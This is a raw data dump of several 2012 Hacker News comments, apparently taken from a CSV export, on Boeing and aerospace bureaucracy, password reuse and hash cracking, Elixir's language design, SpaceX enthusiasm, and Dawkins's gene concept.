Knowing people who have worked at Boeing and hearing their stories, and following how much Boeing has struggled in recent years, it's not surprising at all. If there was ever a hidebound company rapidly outliving its usefulness, it was Boeing. And the company is struggling. In airliners, they keep getting beat by Airbus, and time after time comes up second, third, fourth best in defense bids. Once, when they lost a defense bid to Airbus for a tanker, they lobbied to have the military run the selection over again.<p>The entire aerospace industry has been bureaucratic and hidebound for decades. The story of Lockheed's Skunk Works almost belies the point--they were certainly innovative, but even in the 1960's, the only way they could accomplish it was to get all the best engineers and hide from the bureaucrats long enough to just build shit. Up until the first stealth fighter or so (the F-117) it worked, but it doesn't seem to anymore, considering all the problems, delays, crashes, and other mishaps the F-22 has had.<p>(Though, to be fair, the F-22 is a much more difficult undertaking. The F-117 had exactly one thing different from any other airplane from the 70's: it was shaped funny. It also had fly-by-wire because it was aerodynamically poor, but the engineering was far more conservative. The F-22 has lots of innovations at once--stealth, supercruise, improved avionics, the whole works--which entails far much more risk. Also, the 117 was a black project, which means there were a couple smart people in the Pentagon approving it and working as their clients, as opposed to the 22 where there were hundreds of Congressmen and thousands of federal bureaucrats to worry about as clients.)",1337972319

If blizzard is compromised, the passwords won't be disclosed - just the hashes will be, so re-use isn't <i>immediately</i> an issue. It becomes an issue when the hash is cracked and the attacker can now see which password is being reused, and then reuse it. Of course if the reused password is something like ""hunter2"", the cracked version will look like ""HUNTER2"", but the original case can be guessed in a few tries once the case-insensitive version is discovered.<p>Very roughly, case sensitivity provides about a half bit of entropy. For reference, one bit of entropy takes twice as long to crack.<p>And say what you want about password reuse, but 99% of users re-use passwords at least somewhat, so site owners have an obligation to protect user passwords.",1337971947

I also enjoy Clojure a lot and it really gave me some great ideas that were imported into Elixir. While we have Lisp based implementations on top of the Erlang VM, I don't think clojure-beam can easily see the daylight unless it contains significant departures from Clojure. Unfortunately, extending the Erlang VM is nowhere close to extending the Java VM. :(<p>The problem with the OO approach is that OO didn't suit well an immutable language. The Erlang VM forces us to keep Erlang's semantics and it has been this way before and after the redesign. There is no way around, believe me, I tried. :)<p>I agree its current version is a stronger departure from Ruby, but also simpler and more powerful than before (now we have all of Erlang in our hands!). We are exchanging the OO familiarity by a better/tighter integration with Erlang runtime, which will, hopefully, be a good reason for people to try it out. I also believe there are plenty of reasons for Erlang developers to try it out, it is more familiar (which actually helps) and addresses many of Erlang shortcomings (it provides protocols, dynamic records, dynamic function generation via macros, etc). During the next weeks, I will write a document more specific to Erlang developers on how Elixir addresses these shortcomings.<p>When you give Elixir a try, join us at #elixir-lang, I would love to chat more!",1337970886

4024834,comment,4023484,4024508,57,0,Arjuna,,,"<i>""The enthusiasm shown for this accomplishment on Hacker News is borderline ridiculous.""</i><p>Some thoughts:<p>1. We all want to live in a world where dreams become reality. I think a lot of us are passionate at this moment in time because we are seeing a dream unfold; not just Elon's, but for everyone that is working to make it a reality.<p>2. The majority of us are builders, and we are naturally going to be excited about a company that is building, particularly at this level.<p>3. (Speaking as an American, here)... in the U.S., I think there has been an under-current feeling for the last several years, that could perhaps be paraphrased as, <i>""Where are we heading, as a nation?""</i> I think it is easy for us to lose touch with the pulse of the nation when we are head-down in code at a start-up or elsewhere, but I think this feeling is real. So, this is perhaps at the root of at least some of this passion and excitement. It perhaps affirms, in some way to us, that the collective ""We"" are still builders.<p>4. The U.S. does not currently possess the capability of human spaceflight. We are at a point in history that is similar to the human spaceflight gap that existed between the Apollo program and the Space Shuttle program. The success of SpaceX and this mission is another incremental step toward resuming that mission capability.<p>I think that something that speaks to this is symbolic: an American flag that flew on-board STS-1 was left on the ISS by the crew of STS-135. It is awaiting return to the U.S. by the next American crew that is launched from the U.S.<p>5. As has been noted already, Elon is one of us. He is a builder. I do not know all of the figures, but I do know that he has put at least $100M dollars of his own money into SpaceX [1]. I think we all understand that these types of efforts are the intense result of many people collaborating together across various organizations, different backgrounds, etc. However, the reality is that these types of efforts require serious vision and investment, and I think, again, to see a builder like Elon achieve this is extremely motivating.<p>6. Finally, there is something intrinsic inside of all of us that longs to explore; perhaps for many of us, space is the ultimate expression of that longing (""Space, the final frontier.""), and we are over-flowing with enthusiasm, wonder and hope at this achievement.<p>[1] <a href=""https://www.youtube.com/watch?v=PNwg8FvfuuU#t=248"" rel=""nofollow"">https://www.youtube.com/watch?v=PNwg8FvfuuU#t=248</a>",1337970847

But as our understanding of the nature of information has advanced, it seem like the gene is ultimately an <i>obscuring</i> concept, not a revealing concept.<p>A ""gene"" is not a specific, standardized DNA sequence. As a concept it is not physically specific enough to tie into the stack of rigorous scientific knowledge that starts with quantum mechanics and ascends through physics, past chemistry, to biology. As a result it cannot be treated wholly mathematically, which leaves open the risk of storytelling vs. actual rigorous hypothesizing and testing. The last few chapters of ""The Selfish Gene"" are filled with fuzzy, untestable storytelling for instance.<p>On the other hand, as a unit of information it is far too specific and limited, because of course a gene is not the only way that information can be passed from one generation to the next. Information is also passed through society and culture--and yes, that can lead directly to physical traits. For instance my wife has pierced ears, and so does my mother-in-law. This hole in the ear is a physically measurable trait of both those humans, and it was caused by the direct passage of information from one generation to the next. That chunk of information just does not happen to meet Dawkins' conception of a ""gene"". But why does he get to define which information ""really matters"", and which doesn't, when it comes to physical traits and survival of the fittest?<p>When I read this book review I see Dawkins attempting to defend an early, fuzzy conception of an information theory. Evolution is an <i>information</i> process, and information is information is information, regardless of whether it is coded in DNA, in societal behavior, or in the printed word. I have not read the book in question, but Wilson might be better equipped to break down old distinctions because of his focus on social behavior--which carries information.<p>Ironically Dawkins started down this road with his idea of the ""meme"" but has not been able to make the mental leap to a fully realized information-centric vision of life and evolution.<p>Biologists are in for a hard time in the next few decades. A lot of fuzzy concepts that they take for granted--like ""gene""--are going to be broken down and reformulated rigorously by mathematicians and computer scientists. It is already well on its way--a friend who started his Ph.D. in evolutionary biology in the lab now spends the vast majority of his time at his laptop, coding hypotheses and tests against a deep data set of sequenced genomes.<p>Warning: the preceding has been the ravings of an interested amateur and should not be considered Real Authoritative Science.<p>edit: fixes",1337969931

And it worked: AHT fell by more than 20% among lower-performing teams and decreased by 8% overall at the call center. Now the manager is changing the break schedule at all 10 of the banks call centers (which employ a total of 25,000 people) and is forecasting $15 million a year in productivity increases.""",1337968922
